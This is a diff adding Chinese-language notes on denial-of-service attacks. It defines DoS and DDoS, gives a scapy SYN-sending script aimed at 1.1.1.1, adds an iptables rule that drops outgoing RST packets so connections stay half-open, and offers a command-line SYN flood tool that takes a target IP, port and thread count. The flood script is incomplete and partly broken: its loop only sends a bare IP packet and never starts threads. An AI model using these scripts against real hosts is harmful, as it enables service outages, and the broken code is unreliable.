@@ -1,0 +1,50 @@
+拒绝服务:
+dos(拒绝服务):利用程序漏洞或一对一资源耗尽的攻击。
+ddos(分布式拒绝服务):多对一的攻击，汇聚资源能力，重点在于量大，属于资源耗尽型
+
+#dosTest.py
+import scapy
+i=IP()  #i.display()
+i.dst="1.1.1.1" #目标IP地址
+ 
+t=TCP()  #t.display() 
+t.dport=22  #目标攻击端口   flags=s
+sr1(i/t,verbose=1,timeout=3) #发送数据包
+
+#打开wireshark抓包。ip.addr eq 192.168.1.110
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP #添加本地防火墙策略，拒绝系统自动发送拒绝拒绝包。
+iptables -L #查看防火墙策略
+python3 dos.py #开始攻击
+
+#过程分析:
+软件发送一个syn包，服务器回答一个syn+ack包,本来在此时应该停止了，但是在本机系统看来，我没有给你发syn包，你回了一个syn+ack包,所以本机系统就自动发了一个拒绝建立的包，对方服务器也就断开了这个连接，所以才需要修改防火墙策略，阻止系统自动发送回复的包。
+
+
+#syn_flood.py
+#!/usr/bin/python
+	# -*- coding:utf-8 -*-
+	from scapy.all import *
+	from time import sleep
+	import thread
+	import random
+	import logging
+	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+	if len(sys.argv) !=4:
+		print "用法： ./syn_flood.py [ip地址] [端口] [线程数]"
+		print "举例： ./syn_flood.py 1.1.1.1 80 20"
+		sys.exit()
+
+	target = str(sys.argv[1])
+	port = int(sys.argv[2])
+	threads = int(sys.argv[3])
+
+	print "正在执行 SYN flood 攻击，按ctrl+c停止攻击"
+	def synflood(target,port):
+		while 0==0:
+			x = random.randint(0,65535)
+			send(IP())
+
+
+
+	
